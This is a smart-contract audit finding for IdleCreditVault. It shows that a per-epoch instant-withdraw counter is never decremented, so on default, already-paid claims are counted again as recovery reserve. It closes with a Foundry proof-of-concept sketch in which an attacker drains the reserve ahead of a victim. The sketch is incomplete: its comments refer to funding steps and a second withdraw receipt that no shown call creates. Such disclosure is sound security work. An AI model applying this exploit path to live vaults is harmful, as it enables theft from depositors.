### Title
Stale `instantWithdrawClaimsByEpoch` double-counts already-paid instant claims as default recovery reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
Like CVE-2021-47634's create/remove race that frees the same object twice, `IdleCreditVault` keeps two ledgers for instant-withdraw receipts (`instantWithdrawsRequests` / `pendingInstantWithdraws` vs `instantWithdrawsRequestsByEpoch` / `instantWithdrawClaimsByEpoch`). The "delete" path (`claimInstantWithdrawRequest`) clears only the first pair, while the "create"-side aggregate `instantWithdrawClaimsByEpoch` is never decremented. When the same epoch later defaults, `_defaultPrefundedInstantReserve` re-counts already-paid-out instant claims as reserve backing, inflating `defaultRecoveryPrice` and letting early claimants drain `defaultRecoveryReserve` at the expense of later ones.

### Finding Description
`requestInstantWithdraw` records each receipt in four places: `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch[_user][epoch]`, `instantWithdrawClaimsByEpoch[epoch]` and `pendingInstantWithdraws` (lines 366-374). The funded claim path `claimInstantWithdrawRequest` clears only `instantWithdrawsRequests[_user]` and burns the receipt; neither `instantWithdrawClaimsByEpoch[epoch]` nor `instantWithdrawsRequestsByEpoch` is touched (lines 387-392). `pendingInstantWithdraws` is reduced earlier in `collectInstantWithdrawFunds` when the CDO pulls the funded amount (line 401).

On `finalizeDefault`, `_defaultPrefundedInstantReserve` computes `instantWithdrawClaimsByEpoch[epochNumber] - pendingInstantWithdraws` and adds it to `defaultRecoveryReserve` (lines 685-691, 716-723). Because `instantWithdrawClaimsByEpoch` still contains receipts whose underlyings were already transferred out by `_transferFundedClaim`, the difference includes paid-out amounts `X`. `reserveAmount` and therefore `defaultRecoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis` are inflated by exactly `X` worth of phantom backing.

Every defaulted claimant (`_claimDefaultedWithdrawRequest`, `_claimDefaultedInstantWithdrawRequest`) is paid `claimBasis * defaultRecoveryPrice / RECOVERY_FULL` from `defaultRecoveryReserve`, so the phantom `X` is distributed to whoever claims first, and the reserve runs dry `X` early.

### Impact Explanation
Direct theft plus permanent freezing of unclaimed yield. An attacker who (a) claimed `X` via an instant withdrawal and (b) holds a second position with a defaulted-epoch withdraw receipt is paid at an inflated recovery ratio, extracting up to `X` of value that belongs to other defaulted claimants. Once the reserve is depleted, `_transferDefaultRecovery` reverts on insufficient balance, so later legitimate claimants can never claim — a permanent freeze of their recovery proceeds equal to the phantom amount counted.

### Likelihood Explanation
Requires only unprivileged actions: an instant-withdraw request claimed during the running epoch, then a borrower default finalized with `pendingInstantWithdraws > 0` (i.e., instant receipts only partially prefunded at default time — the common case where the borrower stops funding mid-epoch). The attacker controls the instant claim size `X` and can simultaneously hold a normal withdraw receipt in the defaulted epoch via a second address, so they capture the inflation themselves. No privileged role misbehaves; manager/`finalizeDefault` inputs are honest. The guard at line 696 (`defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0`) does not help — the bug manifests precisely when it is true.

### Recommendation
In `claimInstantWithdrawRequest` (and any other path that pays an instant receipt, including `_claimDefaultedInstantWithdrawRequest`), decrement `instantWithdrawClaimsByEpoch[epoch]` and clear `instantWithdrawsRequestsByEpoch[_user][epoch]` alongside `instantWithdrawsRequests[_user]`, keeping the per-epoch aggregate equal to outstanding (not historical) receipts. Alternatively, compute `_defaultPrefundedInstantReserve` from the sum of still-unclaimed per-epoch receipts rather than a cumulative epoch counter.

### Proof of Concept
Foundry fork sketch (test file style of `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testInstantClaimInflatesDefaultRecoveryReserve() external {
  // enable instant withdrawals
  uint256 instantDelay = cdoEpoch.instantWithdrawDelay();
  vm.prank(manager);
  cdoEpoch.setInstantWithdrawParams(instantDelay, 0, false);

  address attacker = makeAddr('attacker');
  address victim   = makeAddr('victim');
  uint256 amt = 100_000 * ONE_SCALE;
  _depositWithUser(attacker, amt, true);
  _depositWithUser(victim,   amt, true);
  _startEpochAndCheckPrices(0);

  // both request instant withdraws in the running epoch N
  uint256 tA = IERC20(AAtranche).balanceOf(attacker) / 2;
  uint256 tV = IERC20(AAtranche).balanceOf(victim) / 2;
  vm.prank(attacker); cdoEpoch.requestWithdraw(tA, address(AAtranche)); // routed to instant bucket
  vm.prank(victim);   cdoEpoch.requestWithdraw(tV, address(AAtranche));

  skip(instantDelay + 1);
  // borrower/CDO funds ONLY the attacker's instant request (partial prefunding)
  // -> pendingInstantWithdraws still holds victim's basis
  vm.prank(attacker); cdoEpoch.claimInstantWithdrawRequest(); // attacker paid X in full

  // NOTE: instantWithdrawClaimsByEpoch[N] still contains attacker+victim basis

  // epoch N ends in default; strategy epochNumber is NOT bumped on default
  _stopEpochAndCheckPrices(0, initialProvidedApr, 0);
  _checkDefault();

  IdleCreditVault vault = IdleCreditVault(address(strategy));
  uint256 recovered = vault.balanceOf(address(cdoEpoch)); // partial recovery
  deal(defaultUnderlying, manager, recovered);
  vm.startPrank(manager);
  IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
  cdoEpoch.finalizeDefault(recovered, manager);
  vm.stopPrank();

  // reserve counts the already-paid instant claim again
  uint256 reserve = vault.defaultRecoveryReserve();
  assertGt(reserve, recovered, 'reserve includes phantom paid-out instant claims');

  // attacker also holds a defaulted normal withdraw receipt (other half)
  // claimed at inflated price -> drains reserve; victim's later claim reverts
  uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
  vm.prank(attacker); cdoEpoch.claimWithdrawRequest();
  uint256 attackerGot = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;

  vm.prank(victim);
  vm.expectRevert(); // SafeERC20 transfer fails: reserve exhausted by phantom backing
  cdoEpoch.claimWithdrawRequest();
}
```

The key assertion is `defaultRecoveryReserve > recovered`: the difference equals the attacker's already-paid instant claim, counted a second time as recovery backing.
